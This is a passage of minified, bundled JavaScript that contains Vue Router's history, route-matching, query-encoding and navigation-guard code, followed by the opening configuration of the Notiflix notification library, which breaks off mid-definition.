createCurrentLocation(e,t){const{pathname:n,search:s,hash:r}=t,o=e.indexOf("#");if(o>-1){let d=r.includes(e.slice(o))?e.slice(o).length:1,u=r.slice(d);return u[0]!=="/"&&(u="/"+u),stripBase(u,"")}return stripBase(n,e)+s+r}function useHistoryListeners(e,t,n,s){let r=[],o=[],l=null;const d=({state:y})=>{const v=createCurrentLocation(e,location),x=n.value,E=t.value;let S=0;if(y){if(n.value=v,t.value=y,l&&l===x){l=null;return}S=E?y.position-E.position:0}else s(v);r.forEach(w=>{w(n.value,x,{delta:S,type:NavigationType.pop,direction:S?S>0?NavigationDirection.forward:NavigationDirection.back:NavigationDirection.unknown})})};function u(){l=n.value}function f(y){r.push(y);const v=()=>{const x=r.indexOf(y);x>-1&&r.splice(x,1)};return o.push(v),v}function m(){const{history:y}=window;y.state&&y.replaceState(assign$2({},y.state,{scroll:computeScrollPosition()}),"")}function g(){for(const y of o)y();o=[],window.removeEventListener("popstate",d),window.removeEventListener("beforeunload",m)}return window.addEventListener("popstate",d),window.addEventListener("beforeunload",m,{passive:!0}),{pauseListeners:u,listen:f,destroy:g}}function buildState(e,t,n,s=!1,r=!1){return{back:e,current:t,forward:n,replaced:s,position:window.history.length,scroll:r?computeScrollPosition():null}}function useHistoryStateNavigation(e){const{history:t,location:n}=window,s={value:createCurrentLocation(e,n)},r={value:t.state};r.value||o(s.value,{back:null,current:s.value,forward:null,position:t.length-1,replaced:!0,scroll:null},!0);function o(u,f,m){const g=e.indexOf("#"),y=g>-1?(n.host&&document.querySelector("base")?e:e.slice(g))+u:createBaseLocation()+e+u;try{t[m?"replaceState":"pushState"](f,"",y),r.value=f}catch(v){console.error(v),n[m?"replace":"assign"](y)}}function l(u,f){const m=assign$2({},t.state,buildState(r.value.back,u,r.value.forward,!0),f,{position:r.value.position});o(u,m,!0),s.value=u}function d(u,f){const m=assign$2({},r.value,t.state,{forward:u,scroll:computeScrollPosition()});o(m.current,m,!0);const g=assign$2({},buildState(s.value,u,null),{position:m.position+1},f);o(u,g,!1),s.value=u}return{location:s,state:r,push:d,replace:l}}function createWebHistory(e){e=normalizeBase(e);const t=useHistoryStateNavigation(e),n=useHistoryListeners(e,t.state,t.location,t.replace);function s(o,l=!0){l||n.pauseListeners(),history.go(o)}const r=assign$2({location:"",base:e,go:s,createHref:createHref.bind(null,e)},t,n);return Object.defineProperty(r,"location",{enumerable:!0,get:()=>t.location.value}),Object.defineProperty(r,"state",{enumerable:!0,get:()=>t.state.value}),r}function createWebHashHistory(e){return e=location.host?e||location.pathname+location.search:"",e.includes("#")||(e+="#"),createWebHistory(e)}function isRouteLocation(e){return typeof e=="string"||e&&typeof e=="object"}function isRouteName(e){return typeof e=="string"||typeof e=="symbol"}const START_LOCATION_NORMALIZED={path:"/",name:void 0,params:{},query:{},hash:"",fullPath:"/",matched:[],meta:{},redirectedFrom:void 0},NavigationFailureSymbol=Symbol("");var NavigationFailureType;(function(e){e[e.aborted=4]="aborted",e[e.cancelled=8]="cancelled",e[e.duplicated=16]="duplicated"})(NavigationFailureType||(NavigationFailureType={}));function createRouterError(e,t){return assign$2(new Error,{type:e,[NavigationFailureSymbol]:!0},t)}function isNavigationFailure(e,t){return e instanceof Error&&NavigationFailureSymbol in e&&(t==null||!!(e.type&t))}const BASE_PARAM_PATTERN="[^/]+?",BASE_PATH_PARSER_OPTIONS={sensitive:!1,strict:!1,start:!0,end:!0},REGEX_CHARS_RE=/[.+*?^${}()[\]/\\]/g;function tokensToParser(e,t){const n=assign$2({},BASE_PATH_PARSER_OPTIONS,t),s=[];let r=n.start?"^":"";const o=[];for(const f of e){const m=f.length?[]:[90];n.strict&&!f.length&&(r+="/");for(let g=0;g<f.length;g++){const y=f[g];let v=40+(n.sensitive?.25:0);if(y.type===0)g||(r+="/"),r+=y.value.replace(REGEX_CHARS_RE,"\\$&"),v+=40;else if(y.type===1){const{value:x,repeatable:E,optional:S,regexp:w}=y;o.push({name:x,repeatable:E,optional:S});const k=w||BASE_PARAM_PATTERN;if(k!==BASE_PARAM_PATTERN){v+=10;try{new RegExp(`(${k})`)}catch(R){throw new Error(`Invalid custom RegExp for param "${x}" (${k}): `+R.message)}}let C=E?`((?:${k})(?:/(?:${k}))*)`:`(${k})`;g||(C=S&&f.length<2?`(?:/${C})`:"/"+C),S&&(C+="?"),r+=C,v+=20,S&&(v+=-8),E&&(v+=-20),k===".*"&&(v+=-50)}m.push(v)}s.push(m)}if(n.strict&&n.end){const f=s.length-1;s[f][s[f].length-1]+=.7000000000000001}n.strict||(r+="/?"),n.end?r+="$":n.strict&&(r+="(?:/|$)");const l=new RegExp(r,n.sensitive?"":"i");function d(f){const m=f.match(l),g={};if(!m)return null;for(let y=1;y<m.length;y++){const v=m[y]||"",x=o[y-1];g[x.name]=v&&x.repeatable?v.split("/"):v}return g}function u(f){let m="",g=!1;for(const y of e){(!g||!m.endsWith("/"))&&(m+="/"),g=!1;for(const v of y)if(v.type===0)m+=v.value;else if(v.type===1){const{value:x,repeatable:E,optional:S}=v,w=x in f?f[x]:"";if(isArray$1(w)&&!E)throw new Error(`Provided param "${x}" is an array but it is not repeatable (* or + modifiers)`);const k=isArray$1(w)?w.join("/"):w;if(!k)if(S)y.length<2&&(m.endsWith("/")?m=m.slice(0,-1):g=!0);else throw new Error(`Missing required param "${x}"`);m+=k}}return m||"/"}return{re:l,score:s,keys:o,parse:d,stringify:u}}function compareScoreArray(e,t){let n=0;for(;n<e.length&&n<t.length;){const s=t[n]-e[n];if(s)return s;n++}return e.length<t.length?e.length===1&&e[0]===40+40?-1:1:e.length>t.length?t.length===1&&t[0]===40+40?1:-1:0}function comparePathParserScore(e,t){let n=0;const s=e.score,r=t.score;for(;n<s.length&&n<r.length;){const o=compareScoreArray(s[n],r[n]);if(o)return o;n++}if(Math.abs(r.length-s.length)===1){if(isLastScoreNegative(s))return 1;if(isLastScoreNegative(r))return-1}return r.length-s.length}function isLastScoreNegative(e){const t=e[e.length-1];return e.length>0&&t[t.length-1]<0}const ROOT_TOKEN={type:0,value:""},VALID_PARAM_RE=/[a-zA-Z0-9_]/;function tokenizePath(e){if(!e)return[[]];if(e==="/")return[[ROOT_TOKEN]];if(!e.startsWith("/"))throw new Error(`Invalid path "${e}"`);function t(v){throw new Error(`ERR (${n})/"${f}": ${v}`)}let n=0,s=n;const r=[];let o;function l(){o&&r.push(o),o=[]}let d=0,u,f="",m="";function g(){f&&(n===0?o.push({type:0,value:f}):n===1||n===2||n===3?(o.length>1&&(u==="*"||u==="+")&&t(`A repeatable param (${f}) must be alone in its segment. eg: '/:ids+.`),o.push({type:1,value:f,regexp:m,repeatable:u==="*"||u==="+",optional:u==="*"||u==="?"})):t("Invalid state to consume buffer"),f="")}function y(){f+=u}for(;d<e.length;){if(u=e[d++],u==="\\"&&n!==2){s=n,n=4;continue}switch(n){case 0:u==="/"?(f&&g(),l()):u===":"?(g(),n=1):y();break;case 4:y(),n=s;break;case 1:u==="("?n=2:VALID_PARAM_RE.test(u)?y():(g(),n=0,u!=="*"&&u!=="?"&&u!=="+"&&d--);break;case 2:u===")"?m[m.length-1]=="\\"?m=m.slice(0,-1)+u:n=3:m+=u;break;case 3:g(),n=0,u!=="*"&&u!=="?"&&u!=="+"&&d--,m="";break;default:t("Unknown state");break}}return n===2&&t(`Unfinished custom RegExp for param "${f}"`),g(),l(),r}function createRouteRecordMatcher(e,t,n){const s=tokensToParser(tokenizePath(e.path),n),r=assign$2(s,{record:e,parent:t,children:[],alias:[]});return t&&!r.record.aliasOf==!t.record.aliasOf&&t.children.push(r),r}function createRouterMatcher(e,t){const n=[],s=new Map;t=mergeOptions({strict:!1,end:!0,sensitive:!1},t);function r(m){return s.get(m)}function o(m,g,y){const v=!y,x=normalizeRouteRecord(m);x.aliasOf=y&&y.record;const E=mergeOptions(t,m),S=[x];if("alias"in m){const C=typeof m.alias=="string"?[m.alias]:m.alias;for(const R of C)S.push(assign$2({},x,{components:y?y.record.components:x.components,path:R,aliasOf:y?y.record:x}))}let w,k;for(const C of S){const{path:R}=C;if(g&&R[0]!=="/"){const L=g.record.path,O=L[L.length-1]==="/"?"":"/";C.path=g.record.path+(R&&O+R)}if(w=createRouteRecordMatcher(C,g,E),y?y.alias.push(w):(k=k||w,k!==w&&k.alias.push(w),v&&m.name&&!isAliasRecord(w)&&l(m.name)),x.children){const L=x.children;for(let O=0;O<L.length;O++)o(L[O],w,y&&y.children[O])}y=y||w,(w.record.components&&Object.keys(w.record.components).length||w.record.name||w.record.redirect)&&u(w)}return k?()=>{l(k)}:noop}function l(m){if(isRouteName(m)){const g=s.get(m);g&&(s.delete(m),n.splice(n.indexOf(g),1),g.children.forEach(l),g.alias.forEach(l))}else{const g=n.indexOf(m);g>-1&&(n.splice(g,1),m.record.name&&s.delete(m.record.name),m.children.forEach(l),m.alias.forEach(l))}}function d(){return n}function u(m){let g=0;for(;g<n.length&&comparePathParserScore(m,n[g])>=0&&(m.record.path!==n[g].record.path||!isRecordChildOf(m,n[g]));)g++;n.splice(g,0,m),m.record.name&&!isAliasRecord(m)&&s.set(m.record.name,m)}function f(m,g){let y,v={},x,E;if("name"in m&&m.name){if(y=s.get(m.name),!y)throw createRouterError(1,{location:m});E=y.record.name,v=assign$2(paramsFromLocation(g.params,y.keys.filter(k=>!k.optional).map(k=>k.name)),m.params&&paramsFromLocation(m.params,y.keys.map(k=>k.name))),x=y.stringify(v)}else if("path"in m)x=m.path,y=n.find(k=>k.re.test(x)),y&&(v=y.parse(x),E=y.record.name);else{if(y=g.name?s.get(g.name):n.find(k=>k.re.test(g.path)),!y)throw createRouterError(1,{location:m,currentLocation:g});E=y.record.name,v=assign$2({},g.params,m.params),x=y.stringify(v)}const S=[];let w=y;for(;w;)S.unshift(w.record),w=w.parent;return{name:E,path:x,params:v,matched:S,meta:mergeMetaFields(S)}}return e.forEach(m=>o(m)),{addRoute:o,resolve:f,removeRoute:l,getRoutes:d,getRecordMatcher:r}}function paramsFromLocation(e,t){const n={};for(const s of t)s in e&&(n[s]=e[s]);return n}function normalizeRouteRecord(e){return{path:e.path,redirect:e.redirect,name:e.name,meta:e.meta||{},aliasOf:void 0,beforeEnter:e.beforeEnter,props:normalizeRecordProps(e),children:e.children||[],instances:{},leaveGuards:new Set,updateGuards:new Set,enterCallbacks:{},components:"components"in e?e.components||null:e.component&&{default:e.component}}}function normalizeRecordProps(e){const t={},n=e.props||!1;if("component"in e)t.default=n;else for(const s in e.components)t[s]=typeof n=="object"?n[s]:n;return t}function isAliasRecord(e){for(;e;){if(e.record.aliasOf)return!0;e=e.parent}return!1}function mergeMetaFields(e){return e.reduce((t,n)=>assign$2(t,n.meta),{})}function mergeOptions(e,t){const n={};for(const s in e)n[s]=s in t?t[s]:e[s];return n}function isRecordChildOf(e,t){return t.children.some(n=>n===e||isRecordChildOf(e,n))}const HASH_RE=/#/g,AMPERSAND_RE=/&/g,SLASH_RE=/\//g,EQUAL_RE=/=/g,IM_RE=/\?/g,PLUS_RE=/\+/g,ENC_BRACKET_OPEN_RE=/%5B/g,ENC_BRACKET_CLOSE_RE=/%5D/g,ENC_CARET_RE=/%5E/g,ENC_BACKTICK_RE=/%60/g,ENC_CURLY_OPEN_RE=/%7B/g,ENC_PIPE_RE=/%7C/g,ENC_CURLY_CLOSE_RE=/%7D/g,ENC_SPACE_RE=/%20/g;function commonEncode(e){return encodeURI(""+e).replace(ENC_PIPE_RE,"|").replace(ENC_BRACKET_OPEN_RE,"[").replace(ENC_BRACKET_CLOSE_RE,"]")}function encodeHash(e){return commonEncode(e).replace(ENC_CURLY_OPEN_RE,"{").replace(ENC_CURLY_CLOSE_RE,"}").replace(ENC_CARET_RE,"^")}function encodeQueryValue(e){return commonEncode(e).replace(PLUS_RE,"%2B").replace(ENC_SPACE_RE,"+").replace(HASH_RE,"%23").replace(AMPERSAND_RE,"%26").replace(ENC_BACKTICK_RE,"`").replace(ENC_CURLY_OPEN_RE,"{").replace(ENC_CURLY_CLOSE_RE,"}").replace(ENC_CARET_RE,"^")}function encodeQueryKey(e){return encodeQueryValue(e).replace(EQUAL_RE,"%3D")}function encodePath(e){return commonEncode(e).replace(HASH_RE,"%23").replace(IM_RE,"%3F")}function encodeParam(e){return e==null?"":encodePath(e).replace(SLASH_RE,"%2F")}function decode(e){try{return decodeURIComponent(""+e)}catch{}return""+e}function parseQuery(e){const t={};if(e===""||e==="?")return t;const s=(e[0]==="?"?e.slice(1):e).split("&");for(let r=0;r<s.length;++r){const o=s[r].replace(PLUS_RE," "),l=o.indexOf("="),d=decode(l<0?o:o.slice(0,l)),u=l<0?null:decode(o.slice(l+1));if(d in t){let f=t[d];isArray$1(f)||(f=t[d]=[f]),f.push(u)}else t[d]=u}return t}function stringifyQuery(e){let t="";for(let n in e){const s=e[n];if(n=encodeQueryKey(n),s==null){s!==void 0&&(t+=(t.length?"&":"")+n);continue}(isArray$1(s)?s.map(o=>o&&encodeQueryValue(o)):[s&&encodeQueryValue(s)]).forEach(o=>{o!==void 0&&(t+=(t.length?"&":"")+n,o!=null&&(t+="="+o))})}return t}function normalizeQuery(e){const t={};for(const n in e){const s=e[n];s!==void 0&&(t[n]=isArray$1(s)?s.map(r=>r==null?null:""+r):s==null?s:""+s)}return t}const matchedRouteKey=Symbol(""),viewDepthKey=Symbol(""),routerKey=Symbol(""),routeLocationKey=Symbol(""),routerViewLocationKey=Symbol("");function useCallbacks(){let e=[];function t(s){return e.push(s),()=>{const r=e.indexOf(s);r>-1&&e.splice(r,1)}}function n(){e=[]}return{add:t,list:()=>e.slice(),reset:n}}function guardToPromiseFn(e,t,n,s,r){const o=s&&(s.enterCallbacks[r]=s.enterCallbacks[r]||[]);return()=>new Promise((l,d)=>{const u=g=>{g===!1?d(createRouterError(4,{from:n,to:t})):g instanceof Error?d(g):isRouteLocation(g)?d(createRouterError(2,{from:t,to:g})):(o&&s.enterCallbacks[r]===o&&typeof g=="function"&&o.push(g),l())},f=e.call(s&&s.instances[r],t,n,u);let m=Promise.resolve(f);e.length<3&&(m=m.then(u)),m.catch(g=>d(g))})}function extractComponentsGuards(e,t,n,s){const r=[];for(const o of e)for(const l in o.components){let d=o.components[l];if(!(t!=="beforeRouteEnter"&&!o.instances[l]))if(isRouteComponent(d)){const f=(d.__vccOpts||d)[t];f&&r.push(guardToPromiseFn(f,n,s,o,l))}else{let u=d();r.push(()=>u.then(f=>{if(!f)return Promise.reject(new Error(`Couldn't resolve component "${l}" at "${o.path}"`));const m=isESModule(f)?f.default:f;o.components[l]=m;const y=(m.__vccOpts||m)[t];return y&&guardToPromiseFn(y,n,s,o,l)()}))}}return r}function isRouteComponent(e){return typeof e=="object"||"displayName"in e||"props"in e||"__vccOpts"in e}function useLink(e){const t=inject(routerKey),n=inject(routeLocationKey),s=computed(()=>t.resolve(unref(e.to))),r=computed(()=>{const{matched:u}=s.value,{length:f}=u,m=u[f-1],g=n.matched;if(!m||!g.length)return-1;const y=g.findIndex(isSameRouteRecord.bind(null,m));if(y>-1)return y;const v=getOriginalPath(u[f-2]);return f>1&&getOriginalPath(m)===v&&g[g.length-1].path!==v?g.findIndex(isSameRouteRecord.bind(null,u[f-2])):y}),o=computed(()=>r.value>-1&&includesParams(n.params,s.value.params)),l=computed(()=>r.value>-1&&r.value===n.matched.length-1&&isSameRouteLocationParams(n.params,s.value.params));function d(u={}){return guardEvent(u)?t[unref(e.replace)?"replace":"push"](unref(e.to)).catch(noop):Promise.resolve()}return{route:s,href:computed(()=>s.value.href),isActive:o,isExactActive:l,navigate:d}}const RouterLinkImpl=defineComponent({name:"RouterLink",compatConfig:{MODE:3},props:{to:{type:[String,Object],required:!0},replace:Boolean,activeClass:String,exactActiveClass:String,custom:Boolean,ariaCurrentValue:{type:String,default:"page"}},useLink,setup(e,{slots:t}){const n=reactive(useLink(e)),{options:s}=inject(routerKey),r=computed(()=>({[getLinkClass(e.activeClass,s.linkActiveClass,"router-link-active")]:n.isActive,[getLinkClass(e.exactActiveClass,s.linkExactActiveClass,"router-link-exact-active")]:n.isExactActive}));return()=>{const o=t.default&&t.default(n);return e.custom?o:h("a",{"aria-current":n.isExactActive?e.ariaCurrentValue:null,href:n.href,onClick:n.navigate,class:r.value},o)}}}),RouterLink=RouterLinkImpl;function guardEvent(e){if(!(e.metaKey||e.altKey||e.ctrlKey||e.shiftKey)&&!e.defaultPrevented&&!(e.button!==void 0&&e.button!==0)){if(e.currentTarget&&e.currentTarget.getAttribute){const t=e.currentTarget.getAttribute("target");if(/\b_blank\b/i.test(t))return}return e.preventDefault&&e.preventDefault(),!0}}function includesParams(e,t){for(const n in t){const s=t[n],r=e[n];if(typeof s=="string"){if(s!==r)return!1}else if(!isArray$1(r)||r.length!==s.length||s.some((o,l)=>o!==r[l]))return!1}return!0}function getOriginalPath(e){return e?e.aliasOf?e.aliasOf.path:e.path:""}const getLinkClass=(e,t,n)=>e??t??n,RouterViewImpl=defineComponent({name:"RouterView",inheritAttrs:!1,props:{name:{type:String,default:"default"},route:Object},compatConfig:{MODE:3},setup(e,{attrs:t,slots:n}){const s=inject(routerViewLocationKey),r=computed(()=>e.route||s.value),o=inject(viewDepthKey,0),l=computed(()=>{let f=unref(o);const{matched:m}=r.value;let g;for(;(g=m[f])&&!g.components;)f++;return f}),d=computed(()=>r.value.matched[l.value]);provide(viewDepthKey,computed(()=>l.value+1)),provide(matchedRouteKey,d),provide(routerViewLocationKey,r);const u=ref();return watch(()=>[u.value,d.value,e.name],([f,m,g],[y,v,x])=>{m&&(m.instances[g]=f,v&&v!==m&&f&&f===y&&(m.leaveGuards.size||(m.leaveGuards=v.leaveGuards),m.updateGuards.size||(m.updateGuards=v.updateGuards))),f&&m&&(!v||!isSameRouteRecord(m,v)||!y)&&(m.enterCallbacks[g]||[]).forEach(E=>E(f))},{flush:"post"}),()=>{const f=r.value,m=e.name,g=d.value,y=g&&g.components[m];if(!y)return normalizeSlot(n.default,{Component:y,route:f});const v=g.props[m],x=v?v===!0?f.params:typeof v=="function"?v(f):v:null,S=h(y,assign$2({},x,t,{onVnodeUnmounted:w=>{w.component.isUnmounted&&(g.instances[m]=null)},ref:u}));return normalizeSlot(n.default,{Component:S,route:f})||S}}});function normalizeSlot(e,t){if(!e)return null;const n=e(t);return n.length===1?n[0]:n}const RouterView=RouterViewImpl;function createRouter(e){const t=createRouterMatcher(e.routes,e),n=e.parseQuery||parseQuery,s=e.stringifyQuery||stringifyQuery,r=e.history,o=useCallbacks(),l=useCallbacks(),d=useCallbacks(),u=shallowRef(START_LOCATION_NORMALIZED);let f=START_LOCATION_NORMALIZED;isBrowser&&e.scrollBehavior&&"scrollRestoration"in history&&(history.scrollRestoration="manual");const m=applyToParams.bind(null,W=>""+W),g=applyToParams.bind(null,encodeParam),y=applyToParams.bind(null,decode);function v(W,Q){let Z,ne;return isRouteName(W)?(Z=t.getRecordMatcher(W),ne=Q):ne=W,t.addRoute(ne,Z)}function x(W){const Q=t.getRecordMatcher(W);Q&&t.removeRoute(Q)}function E(){return t.getRoutes().map(W=>W.record)}function S(W){return!!t.getRecordMatcher(W)}function w(W,Q){if(Q=assign$2({},Q||u.value),typeof W=="string"){const _=parseURL$1(n,W,Q.path),N=t.resolve({path:_.path},Q),P=r.createHref(_.fullPath);return assign$2(_,N,{params:y(N.params),hash:decode(_.hash),redirectedFrom:void 0,href:P})}let Z;if("path"in W)Z=assign$2({},W,{path:parseURL$1(n,W.path,Q.path).path});else{const _=assign$2({},W.params);for(const N in _)_[N]==null&&delete _[N];Z=assign$2({},W,{params:g(_)}),Q.params=g(Q.params)}const ne=t.resolve(Z,Q),fe=W.hash||"";ne.params=m(y(ne.params));const M=stringifyURL(s,assign$2({},W,{hash:encodeHash(fe),path:ne.path})),T=r.createHref(M);return assign$2({fullPath:M,hash:fe,query:s===stringifyQuery?normalizeQuery(W.query):W.query||{}},ne,{redirectedFrom:void 0,href:T})}function k(W){return typeof W=="string"?parseURL$1(n,W,u.value.path):assign$2({},W)}function C(W,Q){if(f!==W)return createRouterError(8,{from:Q,to:W})}function R(W){return I(W)}function L(W){return R(assign$2(k(W),{replace:!0}))}function O(W){const Q=W.matched[W.matched.length-1];if(Q&&Q.redirect){const{redirect:Z}=Q;let ne=typeof Z=="function"?Z(W):Z;return typeof ne=="string"&&(ne=ne.includes("?")||ne.includes("#")?ne=k(ne):{path:ne},ne.params={}),assign$2({query:W.query,hash:W.hash,params:"path"in ne?{}:W.params},ne)}}function I(W,Q){const Z=f=w(W),ne=u.value,fe=W.state,M=W.force,T=W.replace===!0,_=O(Z);if(_)return I(assign$2(k(_),{state:typeof _=="object"?assign$2({},fe,_.state):fe,force:M,replace:T}),Q||Z);const N=Z;N.redirectedFrom=Q;let P;return!M&&isSameRouteLocation(s,ne,Z)&&(P=createRouterError(16,{to:N,from:ne}),ye(ne,ne,!0,!1)),(P?Promise.resolve(P):G(N,ne)).catch(D=>isNavigationFailure(D)?isNavigationFailure(D,2)?D:ke(D):oe(D,N,ne)).then(D=>{if(D){if(isNavigationFailure(D,2))return I(assign$2({replace:T},k(D.to),{state:typeof D.to=="object"?assign$2({},fe,D.to.state):fe,force:M}),Q||N)}else D=q(N,ne,!0,T,fe);return X(N,ne,D),D})}function A(W,Q){const Z=C(W,Q);return Z?Promise.reject(Z):Promise.resolve()}function j(W){const Q=we.values().next().value;return Q&&typeof Q.runWithContext=="function"?Q.runWithContext(W):W()}function G(W,Q){let Z;const[ne,fe,M]=extractChangingRecords(W,Q);Z=extractComponentsGuards(ne.reverse(),"beforeRouteLeave",W,Q);for(const _ of ne)_.leaveGuards.forEach(N=>{Z.push(guardToPromiseFn(N,W,Q))});const T=A.bind(null,W,Q);return Z.push(T),me(Z).then(()=>{Z=[];for(const _ of o.list())Z.push(guardToPromiseFn(_,W,Q));return Z.push(T),me(Z)}).then(()=>{Z=extractComponentsGuards(fe,"beforeRouteUpdate",W,Q);for(const _ of fe)_.updateGuards.forEach(N=>{Z.push(guardToPromiseFn(N,W,Q))});return Z.push(T),me(Z)}).then(()=>{Z=[];for(const _ of M)if(_.beforeEnter)if(isArray$1(_.beforeEnter))for(const N of _.beforeEnter)Z.push(guardToPromiseFn(N,W,Q));else Z.push(guardToPromiseFn(_.beforeEnter,W,Q));return Z.push(T),me(Z)}).then(()=>(W.matched.forEach(_=>_.enterCallbacks={}),Z=extractComponentsGuards(M,"beforeRouteEnter",W,Q),Z.push(T),me(Z))).then(()=>{Z=[];for(const _ of l.list())Z.push(guardToPromiseFn(_,W,Q));return Z.push(T),me(Z)}).catch(_=>isNavigationFailure(_,8)?_:Promise.reject(_))}function X(W,Q,Z){d.list().forEach(ne=>j(()=>ne(W,Q,Z)))}function q(W,Q,Z,ne,fe){const M=C(W,Q);if(M)return M;const T=Q===START_LOCATION_NORMALIZED,_=isBrowser?history.state:{};Z&&(ne||T?r.replace(W.fullPath,assign$2({scroll:T&&_&&_.scroll},fe)):r.push(W.fullPath,fe)),u.value=W,ye(W,Q,Z,T),ke()}let J;function K(){J||(J=r.listen((W,Q,Z)=>{if(!$e.listening)return;const ne=w(W),fe=O(ne);if(fe){I(assign$2(fe,{replace:!0}),ne).catch(noop);return}f=ne;const M=u.value;isBrowser&&saveScrollPosition(getScrollKey(M.fullPath,Z.delta),computeScrollPosition()),G(ne,M).catch(T=>isNavigationFailure(T,12)?T:isNavigationFailure(T,2)?(I(T.to,ne).then(_=>{isNavigationFailure(_,20)&&!Z.delta&&Z.type===NavigationType.pop&&r.go(-1,!1)}).catch(noop),Promise.reject()):(Z.delta&&r.go(-Z.delta,!1),oe(T,ne,M))).then(T=>{T=T||q(ne,M,!1),T&&(Z.delta&&!isNavigationFailure(T,8)?r.go(-Z.delta,!1):Z.type===NavigationType.pop&&isNavigationFailure(T,20)&&r.go(-1,!1)),X(ne,M,T)}).catch(noop)}))}let le=useCallbacks(),se=useCallbacks(),de;function oe(W,Q,Z){ke(W);const ne=se.list();return ne.length?ne.forEach(fe=>fe(W,Q,Z)):console.error(W),Promise.reject(W)}function ge(){return de&&u.value!==START_LOCATION_NORMALIZED?Promise.resolve():new Promise((W,Q)=>{le.add([W,Q])})}function ke(W){return de||(de=!W,K(),le.list().forEach(([Q,Z])=>W?Z(W):Q()),le.reset()),W}function ye(W,Q,Z,ne){const{scrollBehavior:fe}=e;if(!isBrowser||!fe)return Promise.resolve();const M=!Z&&getSavedScrollPosition(getScrollKey(W.fullPath,0))||(ne||!Z)&&history.state&&history.state.scroll||null;return nextTick().then(()=>fe(W,Q,M)).then(T=>T&&scrollToPosition(T)).catch(T=>oe(T,W,Q))}const he=W=>r.go(W);let Ce;const we=new Set,$e={currentRoute:u,listening:!0,addRoute:v,removeRoute:x,hasRoute:S,getRoutes:E,resolve:w,options:e,push:R,replace:L,go:he,back:()=>he(-1),forward:()=>he(1),beforeEach:o.add,beforeResolve:l.add,afterEach:d.add,onError:se.add,isReady:ge,install(W){const Q=this;W.component("RouterLink",RouterLink),W.component("RouterView",RouterView),W.config.globalProperties.$router=Q,Object.defineProperty(W.config.globalProperties,"$route",{enumerable:!0,get:()=>unref(u)}),isBrowser&&!Ce&&u.value===START_LOCATION_NORMALIZED&&(Ce=!0,R(r.location).catch(fe=>{}));const Z={};for(const fe in START_LOCATION_NORMALIZED)Object.defineProperty(Z,fe,{get:()=>u.value[fe],enumerable:!0});W.provide(routerKey,Q),W.provide(routeLocationKey,shallowReactive(Z)),W.provide(routerViewLocationKey,u);const ne=W.unmount;we.add(W),W.unmount=function(){we.delete(W),we.size<1&&(f=START_LOCATION_NORMALIZED,J&&J(),J=null,u.value=START_LOCATION_NORMALIZED,Ce=!1,de=!1),ne()}}};function me(W){return W.reduce((Q,Z)=>Q.then(()=>j(Z)),Promise.resolve())}return $e}function extractChangingRecords(e,t){const n=[],s=[],r=[],o=Math.max(t.matched.length,e.matched.length);for(let l=0;l<o;l++){const d=t.matched[l];d&&(e.matched.find(f=>isSameRouteRecord(f,d))?s.push(d):n.push(d));const u=e.matched[l];u&&(t.matched.find(f=>isSameRouteRecord(f,u))||r.push(u))}return[n,s,r]}var notiflixAio3_2_6_min={exports:{}};(function(e){(function(t,n){e.exports=n(t)})(typeof commonjsGlobal>"u"?typeof window>"u"?commonjsGlobal:window:commonjsGlobal,function(t){if(typeof t>"u"&&typeof t.document>"u")return!1;var n,s,r,o,l,d=`

Visit documentation page to learn more: https://notiflix.github.io/documentation`,u='-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif',f={Success:"Success",Failure:"Failure",Warning:"Warning",Info:"Info"},m={wrapID:"NotiflixNotifyWrap",overlayID:"NotiflixNotifyOverlay",width:"280px",position:"right-top",distance:"10px",opacity:1,borderRadius:"5px",rtl:!1,timeout:3e3,messageMaxLength:110,backOverlay:!1,backOverlayColor:"rgba(0,0,0,0.5)",plainText:!0,showOnlyTheLastOne:!1,clickToClose:!1,pauseOnHover:!0,ID:"NotiflixNotify",className:"notiflix-notify",zindex:4001,fontFamily:"Quicksand",fontSize:"13px",cssAnimation:!0,cssAnimationDuration:400,cssAnimationStyle:"fade",closeButton:!1,useIcon:!0,useFontAwesome:!1,fontAwesomeIconStyle:"basic",fontAwesomeIconSize:"34px",success:{background:"#32c682",textColor:"#fff",childClassName:"notiflix-notify-success",notiflixIconColor:"rgba(0,0,0,0.2)",fontAwesomeClassName:"fas fa-check-circle",fontAwesomeIconColor:"rgba(0,0,0,0.2)",backOverlayColor:"rgba(50,198,130,0.2)"},failure:{background:"#ff5549",textColor:"#fff",childClassName:"notiflix-notify-failure",notiflixIconColor:"rgba(0,0,0,0.2)",fontAwesomeClassName:"fas fa-times-circle",fontAwesomeIconColor:"rgba(0,0,0,0.2)",backOverlayColor:"rgba(255,85,73,0.2)"},warning:{background:"#eebf31",textColor:"#fff",childClassName:"notiflix-notify-warning",notiflixIconColor:"rgba(0,0,0,0.2)",fontAwesomeClassName:"fas fa-exclamation-circle",fontAwesomeIconColor:"rgba(0,0,0,0.2)",backOverlayColor:"rgba(238,191,49,0.2)"},info:{background:"#26c0d3",textColor:"#fff",childClassName:"notiflix-notify-info",notiflixIconColor:"rgba(0,0,0,0.2)",fontAwesomeClassName:"fas fa-info-circle",fontAwesomeIconColor:"rgba(0,0,0,0.2)",backOverlayColor:"rgba(38,192,211,0.2)"}},g={Success:"Success",Failure:"Failure",Warning:"Warning",Info:"Info"},y={ID:"NotiflixReportWrap",className:"notiflix-report",width:"320px",backgroundColor:"#f8f8f8",borderRadius:"25px",rtl:!1,zindex:4002,backOverlay:!0,backOverlayColor:"rgba(0,0,0,0.5)",backOverlayClickToClose:!1,fontFamily:"Quicksand",svgSize:"110px",plainText:!0,titleFontSize:"16px",titleMaxLength:34,messageFontSize:"13px",messageMaxLength:400,buttonFontSize:"14px",buttonMaxLength:34,cssAnimation:!0,cssAnimationDuration:360,cssAnimationStyle:"fade",success:{svgColor:"#32c682",titleColor:"#1e1e1e",messageColor:"#242424",buttonBackground:"#32c682",buttonColor:"#fff",backOverlayColor:"rgba(50,198,130,0.2)"},failure:{svgColor:"#ff5549",titleColor:"#1e1e1e",messageColor:"#242424",buttonBackground:"#ff5549",buttonColor:"#fff",backOverlayColor:"rgba(255,85,73,0.2)"},warning:{svgColor:"#eebf31",titleColor:"#1e1e1e",messageColor:"#242424",buttonBackground:"#eebf31",buttonColor:"#fff",backOverlayColor:"rgba(238,191,49,0.2)"},info:{svgColor:"#26c0d3",titleColor:"#1e1e1e",messageColor:"#242424",buttonBackground:"#26c0d3",buttonColor:"#fff",backOverlayColor:"rgba(38,192,211,0.2)"}},v={Show:"Show",Ask:"Ask",Prompt:"Prompt"},x={ID:"NotiflixConfirmW